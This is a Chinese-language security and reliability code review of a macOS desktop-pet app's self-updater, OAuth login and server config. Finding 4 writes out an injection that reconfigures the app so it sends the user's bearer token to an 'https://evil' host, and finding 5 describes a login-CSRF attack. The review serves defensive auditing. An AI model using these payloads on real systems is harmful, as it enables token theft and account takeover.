# 005 反方审稿报告：自更新 / Priestess 登录 / 桌宠模式

审稿范围：`macos/Sources/Rhodeside/{RemoteUpdater,Auth,AppDelegate,PetManager,Pet,SettingsController,Debug,Paths}.swift`、
`macos/Sources/PetCore/{Brain,Config}.swift`、`macos/scripts/{publish.mjs,deploy.sh,build-app.sh}`、
`web/src/{auth,control,settings}`、`/opt/stacks/rhodeside/{compose.yaml,nginx.conf,auth/server.mjs}`。
只读，没有改文件。线上只做了 GET/HEAD（外加一次不带凭据的 POST /v1/ticket，返回 401 属正常）。

线上现状（2026-09-30 实测）：`/v1/app.json` 指向 build 1790694811538，包 **1.8 MB**；
`/v1/apps/*` 返回 `cf-cache-status: BYPASS`（`private` 起作用了）；`ENFORCE=0`。

按严重程度排序。

## 1.【高】关掉「自动更新」拦不住 App 自更新和重启

- 位置：`RemoteUpdater.swift:96-107`（`check()` 只判断 `busy` 和 URL，不看 `config.enabled`）；
  `PetManager.swift:53-57`（`auth.onChange` 里无条件调用 `updater.check()`）；`SettingsController.swift:193-194`。
- 触发：用户在设置里关掉「自动更新」（这时 `apply` 不建 timer），然后登录、退出、刷新失败，任何一次
  `Auth.onChange` 都会走完整的 `cycle()`：拉 app.json，下载，stage，`handOff`，最后 `NSApp.terminate`。
  「立即检查」也一样。
- 为什么错：用户明确关掉的开关被绕过，App 会被替换并重启。关掉更新多半就是为了钉住某个版本
  （比如调试时、或者自更新坏了以后改用 `deploy.sh install`），这时被静默换掉尤其糟糕。
- 修法：`check()` 开头加 `guard config.enabled`（如果「立即检查」想在关闭状态下也能用，就给它一个只检查、
  不安装的参数）；`auth.onChange` 里的 `check()` 同样要受 `enabled` 约束。

## 2.【中】启动后 8 秒的 `markHealthy()` 会删掉正要交接的 `staged`，把好版本误回滚并永久拉黑

- 位置：`AppDelegate.swift:36`（不管当前在做什么，8 秒后都调 `markHealthy`）；
  `RemoteUpdater.swift:440-447`（`markHealthy` 会删 `updates/staged`，也会删所有 `download-*`）；
  `RemoteUpdater.swift:189-198`（stage 完成 → `handOff` → 0.2 秒后才 terminate）；交接脚本第 500 行（`mv "$NEW" "$DEST"`）。
- 触发：App 刚启动，`start()` 马上就检查，发现有新 build。下载加 stage 刚好在约 8 秒时完成（网络稍慢；包只有 1.8 MB，
  总时长落在 8 秒附近很现实），main 队列上的 `markHealthy` 插进了 `handOff` 和进程真正退出之间，或者插进了
  交接脚本 `mv` 之前。结果 `staged/Rhodeside.app` 被删，脚本走到「放入新版本失败，恢复旧版本」，执行
  `finish rolledBack`，旧版读到 result.json 后调用 `markFailed(build)`。
- 后果：一个完全正常的 build 被写进 `failed-builds.json`。设置页显示「该版本启动失败，已回滚」，而且
  **没有任何重试途径**：`check(force:)` 只清 `backoff`/`cache`，不清 failed 列表（`RemoteUpdater.swift:98-101`、`461-471`），
  只能等下一次发版。同一个窗口里如果 stage 还在跑，也会被打断（这种情况只会进入退避，问题不大）。
- 修法：把清理挪到启动时同步执行，在第一次 `check()` 之前（`RemoteUpdater.init` 里做）；`markHealthy` 只写
  `healthy-<build>`，不删东西。另外，`handOff` 之后要禁止再进 `cycle`（见第 9 条），「立即检查」也应该能清掉 failed 列表。

## 3.【中】换票返回 401 时没有退避，每 5 秒轮转一次 refresh token

- 位置：`RemoteUpdater.swift:314-338`；`server.mjs:75`（`body.app_id !== APP_ID` 时返回 401 `invalid_token`）。
- 触发：票据服务对一个**有效的**新 access token 仍然回 401。比如 `AuthConfig.appID` 被改成了别的值、
  Priestess `/me` 不返回 `app_id` 或配置错了 `PRIESTESS_ME`。每一轮的过程都是：attempt 0 用缓存的 access 拿到 401，
  `invalidateAccess()`；attempt 1 调 `accessToken()`，进而 `refresh()`，**轮转 refresh token**，再换票又是 401，抛错。
  `cycle` 提前 return，没有任何退避。下一轮（`interval` 默认 5 秒）`ticket` 仍是 nil，于是同样的过程重来一遍。
- 为什么错：手册要求「refresh 一次」，这里是**每 5 秒 refresh 一次，永不停止**。每次轮转都是一次 refresh token 复用
  检测的风险（响应丢了就会撤掉整条会话），也会一直打 Priestess。
- 同类问题：`Auth.handle` 的 default 分支（`Auth.swift:229-231`）对 `/refresh` 返回的非 `invalid_refresh_token` 的 401
  （比如会话被撤销）保留令牌，之后每轮都拿死掉的 refresh token 再试。
- 修法：`ticketHeaders` 失败也要进退避（按错误类型设冷却）；同一个 access token 换票得到 401 以后最多 refresh 一次，
  并把「刚刷新过仍然 401」记下来，冷却期内不再刷新；`/refresh` 返回的任何 401 都按登出处理。

## 4.【中】`rhodeside://debug/*` 对任意网页开放，能改配置、把 Bearer 令牌送到外部

- 位置：`Debug.swift:9-27`（`eval`、`eval-page` 可以在桌宠页和设置/控制页里执行任意 JS，没有任何鉴权）；
  `SettingsController.swift:154-155`（`updateGlobal` 接受任意 patch）；`RemoteUpdater.swift:314-321`
  （`Authorization: Bearer <access>` 发往 `config.updates.url + /v1/ticket`，不限定 https，也不限定主机）。
- 触发：任何网页执行 `location = 'rhodeside://debug/eval-page?page=settings&js=' + …`，前提是设置或控制页开着；
  浏览器会弹「打开 Rhodeside？」，而这次登录流程本身就在训练用户点「允许」。注入的 JS 可以
  `webkit.messageHandlers.rhodeside.postMessage({type:'updateGlobal',patch:{updates:{enabled:true,url:'https://evil',interval:5}}})`，
  下一轮换票时 Priestess access token 就发给了 evil。它也可以改 `auth.api`，把下一次「登录 Priestess」引到钓鱼页，
  或者 `deleteModel`、`removePet`。
- 修法：debug 路由只在调试开关打开时才响应（比如一个 config 字段或环境变量），或者要求带本机随机密钥；
  `eval`/`eval-page` 在 release 构建里去掉。`updates.url`、`auth.api` 强制 https，Bearer 只发往固定的允许主机。

## 5.【中】state 可以省略；校验失败会清掉进行中的登录

- 位置：`Auth.swift:115-119`。
- 问题 a：`if let s = arg("state"), s != p.state` 的意思是**不带 state 就直接放行**。state 是防登录 CSRF 的，
  回调的来源又是任何网页都能触发的 `rhodeside://`，所以缺 state 应该拒绝。现在的安全性完全靠 Priestess 在
  `/exchange` 端对每个 code 都强制核对 PKCE。只要某个 code 签发时没带 challenge（比如应用没开 `require_pkce`），
  攻击者就能让受害者的 App 登进攻击者的账号。
- 问题 b：state 不匹配时 `fail()` 会把 `pending` 置 nil（`Auth.swift:240-241`）。场景一：用户点了两次
  「重新打开登录页」（`Settings.tsx` 在 signingIn 阶段专门显示这个按钮），然后在**先打开的那个**标签页里完成登录，
  state 对不上，pending 被清空，再去第二个标签页完成登录会得到「没有进行中的登录」。场景二：任何网页发一条
  假回调就能打断一次正在进行的登录。
- 修法：缺 state 视为失败；state 不匹配时只拒绝这一次回调，不清 `pending`（或者保留最近几次的
  `(state, verifier)`，按 state 找对应的 verifier）。

## 6.【中低】交接前不检查目标能不能替换：不可写、被 translocate 或不是 .app 时，每个新 build 都会让 App 退出重启一次再回滚

- 位置：`RemoteUpdater.swift:428-437`（`DEST = Bundle.main.bundleURL.path`，没有任何预检）；`RemoteUpdater.swift:133`
  （`Paths.appBuild` 取不到时是 0，任何远端 build 都比它大）。
- 触发：
  - App 放在不可写的位置（root 拥有的 `/Applications`）或被 App Translocation 挪到只读的随机路径。每次发版都会
    下载，`handOff`，旧进程退出，脚本 `mv "$DEST" "$PREV"` 失败，`finish rolledBack`，重新打开，拉黑。用户看到的是
    每次 `deploy.sh`（`dev.mjs` 改一次 Swift 就发一次）桌宠都闪退重启一次，却永远更新不上。
  - 直接运行 SwiftPM 产物（`.build/.../Rhodeside`，Info.plist 里没有 RhodesideBuild，所以 `appBuild=0`）。这时
    `bundleURL` 是 `.build/<arch>/debug` **这个目录**，脚本会把它改名成 `debug.previous`，再把 `Rhodeside.app`
    挪进来冒充 `debug`。`open` 一个没有 .app 后缀的目录多半启动不了，40 秒后回滚。虽然会恢复，但构建目录被搬动过，
    期间 `rm -rf "$DEST"` 删的正是这个位置。
- 修法：`updateApp` 前检查 `appBuild > 0`、`bundleURL.pathExtension == "app"`、父目录可写、路径不含
  `/AppTranslocation/`，任一不满足就把 `appState` 设成类似 "manual" 的状态，不下载也不交接。

## 7.【低】登出（或重新登录）和正在进行的 refresh 竞态，令牌会被写回来

- 位置：`Auth.swift:135-143`（logout 调 `clearTokens()`，也把 `refreshing` 置 nil，但不取消那个 Task）；
  `Auth.swift:165-171`（refresh 完成后无条件 `store(json)`）。
- 触发：refresh 请求还在飞的时候用户点了「退出登录」（或者新登录的 `/exchange` 先回来）。refresh 回来后 `store()`
  把新令牌写回内存和 `auth.json`。`phase` 显示 signedOut，`accessToken()` 却照样能用，下次启动又变成 signedIn。
  新登录的令牌也可能被旧会话的刷新结果覆盖掉。
- 修法：加一个会话代号（generation），logout/login 时 +1，refresh 完成后发现代号变了就丢弃结果，
  并用这份 refresh token 去 `/logout`。

## 8.【低】换票返回 403 `app_access_denied` 时不更新 `Auth.phase`

- 位置：`RemoteUpdater.swift:334` 抛出 `Auth.Failure.denied`，但 `Auth.phase` 不变。
- 后果：账号区继续显示「已登录」，只有更新区出现一行错误；而且每 5 秒还会打一次 `/v1/ticket`
  （票据服务会缓存 `/me` 60 秒，但 nginx 请求照样会有）。手册要求 403 app_access_denied「明确提示」，并且不要循环。
- 修法：提供 `auth.markDenied()`，把 phase 设成 `.denied` 并调 onChange；updater 在 denied 状态下不再换票，
  直到重新登录。

## 9.【低】交接脚本与状态机的一些小问题

- 脚本不幂等（`RemoteUpdater.swift:485-516`）：`launchctl submit` 的任务带 keep-alive 语义。脚本如果在 `finish`
  之前被意外杀掉，launchd 会用**同样的参数**重跑：第 498 行 `rm -rf "$PREV"` 把唯一的旧版备份删掉，第 499 行把
  （已经是新版的）DEST 挪成 PREV，第 500 行因为 `$NEW` 已经不存在而失败，于是把新版挪回去，结果误报 `rolledBack`，
  正在运行的这个 build 被拉黑。修法：开头检查一个进度标记（例如 `$DIR/install-$BUILD.state`），已经换过就直接跳到
  等待健康那一步。
- 回滚时用 `pkill -f "$DEST/Contents/MacOS/Rhodeside"` 按路径正则杀进程（第 511 行）。路径里有 `(`、`+` 这类正则字符时
  会匹配不上，于是不健康的新进程没被杀掉。接着 `rm -rf "$DEST"` 删掉它正在用的文件，`open` 旧版时 LaunchServices
  发现同 bundle id 的进程还在，只会把它激活，旧版根本起不来。修法：新版把自己的 pid 写进 `healthy`/`started-<build>`，
  脚本按 pid 杀；或者用 `pkill -F`，或精确比较 `pgrep -x Rhodeside` 的结果。
- `handOff` 之后没有「正在重启」闸门：`check()`（`RemoteUpdater.swift:96`）不看 `appState == "restarting"`。
  在那 0.2 秒加上退出流程的时间里，如果 `auth.onChange` 再触发一轮 cycle，它会重新 `untar` 到 staged（先删目录），
  和第 2 条是同一种后果。修法：`check()` 里 `guard appState != "restarting"`。
- 「健康」的定义只是「活过 8 秒」（`AppDelegate.swift:36`），和页面有没有加载、桌宠有没有画出来无关。成功后
  `.previous` 立即被删（脚本第 506 行），第 9 秒崩溃的版本就没有回退余地了。建议至少等第一只桌宠 `loaded`
  （或者 PetManager 起来且没有致命错误）再写 healthy，`.previous` 留到下一次成功启动再删。

## 10.【低】`/auth/assets/` 把全部前端 JS 公开发布，绕过了票据

- 位置：`publish.mjs:104`（`cpSync(join(dir,'assets'), …)` 拷的是整个 assets）；`nginx.conf:67-70`
  （`/auth/assets/` 公开，而且 `public, max-age=31536000`，会被 CDN 缓存）。
- 证据：`/opt/stacks/rhodeside/data/auth/assets/` 下有 `settings-*.js`、`control-*.js`、`pet-*.js`、`index-*.js`、
  `loader-*.js`。
- 后果：`ENFORCE=1` 以后，前端包本应只有持票用户能拿到，但所有页面的代码都能从公开路径直接下载。
- 修法：回跳页单独打包（单独的 vite 入口或 `manualChunks`），只发布 `auth-callback` 实际引用的那几个文件
  （可以从 `auth-callback.html` 里解析出引用列表再拷）。

## 11.【低】nginx 对 `auth:8081` 只在启动时解析一次；票据服务换 IP 以后所有清单请求都 5xx，ENFORCE=0 时也一样

- 位置：`nginx.conf:4-6`（`upstream { server auth:8081; }`），`nginx.conf:42-55`（`auth_request /_check`，ENFORCE=0 时
  同样要经过这一步）。
- 触发：只重建或更新 auth 容器（`docker compose up -d auth`，或者改了镜像），它拿到新 IP，nginx 还连旧 IP。
  `auth_request` 失败，清单返回 500/502，所有客户端都拉不到更新。这时 `ENFORCE=0` 也救不了，因为
  「放行」这个结论本身就要由 auth 服务给出。
- 修法：`resolver 127.0.0.11 valid=10s;` 配合变量形式的 `proxy_pass`；或者在 compose 里给 web 加一条
  「auth 重建时连带重启 web」的约定；或者 ENFORCE=0 时 nginx 干脆不配 `auth_request`。

## 12.【低／需确认】票据服务没有用户白名单

- 位置：`server.mjs:73-78`：只要 `/me` 返回 200 且 `app_id` 对得上就签发票据。
- 依据：RakkoBudget 的 Priestess 接入手册摘录（`RakkoBudget/tasks/018-priestess-login.md:38-40`）写着「Priestess 的 APP
  默认对所有登录用户开放，所以必须有服务端闸」。如果 Rhodeside 这个 app 在 Priestess 后台没有限制可访问的用户，
  那么 `ENFORCE=1` 实际只等于「有一个 Priestess 账号」。
- 修法：确认 Priestess 后台是否限制了 rhodeside 的可访问用户；如果没有，就在票据服务里加一个 `ALLOWED_SUBS` 环境变量，
  不命中返回 403 `app_access_denied`（客户端已经能识别这个码）。

## 查过、没发现问题的地方（避免重复审）

- 签名链：Ed25519 签的是 payload 原始字节；sha256 和 size 在签名范围内；`kind` 防止拿前端清单冒充 App 清单；包路径
  限定了前缀并拒绝 `..`；构建号必须大于当前才安装，不能降级。没找到绕过签名的路径（服务端能做的最多是「不给新版」
  或者「给一个更老但仍比客户端新的已签 build」，这是这类方案固有的限制）。
- 交接脚本的引号：`Application Support` 里的空格在 `$DIR`、`$DEST`、`$NEW` 的所有用法里都有引号；参数通过
  launchctl submit 的 argv 逐个传入，没有被拼接。
- `launchctl remove` 自杀的时机：在 `finish` 最后执行，任务已经移除所以不会被重启；新版在 8 秒内又触发下一次交接时，
  `handOff` 先 remove 旧脚本，旧脚本就不会在之后误回滚。
- Brain：`timer = .infinity` 只在 stay 模式的 sit/sleep 中出现。`setActivity(.auto)` 走 default 分支
  （`!timer.isFinite` 时 `enter(.idle)`），`setActivity(.walk)` 用 `min` 收回，拖拽、落地、瞬移都会经过 `enter(.idle)`
  重置计时，不会卡住。walk 模式下模型没有移动动画时，每 walkPause 秒 `enter(.idle)` 一次，没有帧内死循环；
  Tuning 把区间限制在 ≥0，[0,0] 最多就是每帧 decide 一次。
- 前后端字段：`settingsState()`/`Pet.summary`/`updater.status`/`auth.status` 的键与 `bridge.ts` 里的
  `NativeState`/`PetSummary`/`UpdateStatus`/`AuthStatus` 一一对得上；`perform`/`openPage`/`authLogin`/`authLogout`
  的消息字段一致；`sets` 的元素是 `{outfit, group}`，和 `pet/main.ts:200` 一致。
- 单飞锁：`refresh()` 是 @MainActor，`refreshing` 在第一次挂起之前就已赋值，同一时刻只有一个 `/refresh` 在飞；
  其他调用方都经过 `accessToken()`。唯一的漏洞是第 7 条的登出/登录竞态。
- CDN：清单是 `no-store`，包是 `private`（实测 `cf-cache-status: BYPASS`/`DYNAMIC`），CF 不会替没带票的人缓存。
